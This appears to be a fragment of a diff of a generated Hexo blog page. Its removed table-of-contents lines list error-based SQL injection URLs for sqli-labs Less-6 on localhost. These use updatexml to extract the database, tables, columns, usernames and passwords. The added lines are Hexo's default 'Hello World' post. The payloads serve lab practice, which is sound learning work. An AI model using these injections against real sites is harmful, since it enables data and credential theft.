class="toc-text">1、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select updatexml(1,concat(0x7e,(database()),0x7e),1) –+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-table-name-from-information-schema-tables-where-table-schema-%E2%80%99security%E2%80%99-limit-0-1-0x7e-1-%E2%80%93"><span class="toc-number">1.3.2.</span> <span class="toc-text">2、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),0x7e),1) –+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-column-name-from-information-schema-columns-where-table-name-%E2%80%99users%E2%80%99-0x7e-1-%E2%80%93"><span class="toc-number">1.3.3.</span> <span class="toc-text">3、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ ),0x7e),1) –+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-username-from-users-0x7e-1-%E2%80%93"><span class="toc-number">1.3.4.</span> <span class="toc-text">4、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) –+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81http-127-0-0-1-sqli-Less-6-id-1-quot-union-select-updatexml-1-concat-0x7e-select-group-concat-password-from-users-0x7e-1-%E2%80%93"><span class="toc-number">1.3.5.</span> <span class="toc-text">5、http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-6&#x2F;?id&#x3D;1&quot; union select updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) –+</span></a></li></ol></li></ol></li></ol>
-                    </div>
-                </span>
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/28/hello-world/">Hello World</a>
+    </h1>
+  
+
+        
+        <a href="/2021/11/28/hello-world/" class="archive-article-date">
+  	<time datetime="2021-11-28T15:53:39.287Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/11/28/hello-world/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
             </div>
         </div>
+        
         
     </div>
 </aside>
 
 
 
-  
-  
-  
 
   
-
   
-
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    </nav>
   
 
 
@@ -372,8 +347,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: false,
-		isPost: true,
+		isHome: true,
+		isPost: false,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
